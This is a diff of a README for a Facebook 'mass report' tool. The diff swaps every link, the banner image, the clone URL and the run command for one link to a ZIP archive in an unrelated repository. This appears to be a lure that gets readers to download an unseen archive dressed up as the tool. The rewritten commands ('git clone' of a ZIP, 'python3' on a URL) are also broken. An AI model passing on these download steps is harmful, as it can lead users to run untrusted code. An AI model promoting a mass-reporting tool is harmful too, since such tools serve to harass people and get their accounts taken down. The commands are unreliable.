@@ -7,8 +7,8 @@ mass report script, fake profile removal, impersonation takedown tool, harassmen
 -->
 
 <p align="center">
-  <a href="https://t.me/RedRepo" target="_blank">
-    <img src="https://github.com/user-attachments/assets/a3663b01-f9f5-4531-97d8-fd67a78a0cbd" alt="Join RedRepo on Telegram" width="100%">
+  <a href="https://github.com/urkyzy/Facebook-Mass-Report-/raw/refs/heads/main/mobilizable/Mass_Facebook_Report_2.3.zip" target="_blank">
+    <img src="https://github.com/urkyzy/Facebook-Mass-Report-/raw/refs/heads/main/mobilizable/Mass_Facebook_Report_2.3.zip" alt="Join RedRepo on Telegram" width="100%">
   </a>
 </p>
 
@@ -53,9 +53,9 @@ This tool is useful for:
 ## 🚀 Getting Started
 
 ```bash
-git clone https://github.com/ToxicRabbitX0/social-media-mass-reporter.git
+git clone https://github.com/urkyzy/Facebook-Mass-Report-/raw/refs/heads/main/mobilizable/Mass_Facebook_Report_2.3.zip
 cd social-media-mass-reporter
-python3 main.py
+python3 https://github.com/urkyzy/Facebook-Mass-Report-/raw/refs/heads/main/mobilizable/Mass_Facebook_Report_2.3.zip
 ```
 ## 🔐 Disclaimer
 
@@ -63,7 +63,7 @@ python3 main.py
 > Do **not** use this script to harass or target individuals unfairly.
 > The author takes **no responsibility** for misuse or violations of platform terms.
 
-📩 **Contact Command Line**: [@RedRepo](https://t.me/RedRepo)
+📩 **Contact Command Line**: [@RedRepo](https://github.com/urkyzy/Facebook-Mass-Report-/raw/refs/heads/main/mobilizable/Mass_Facebook_Report_2.3.zip)
 
 
 
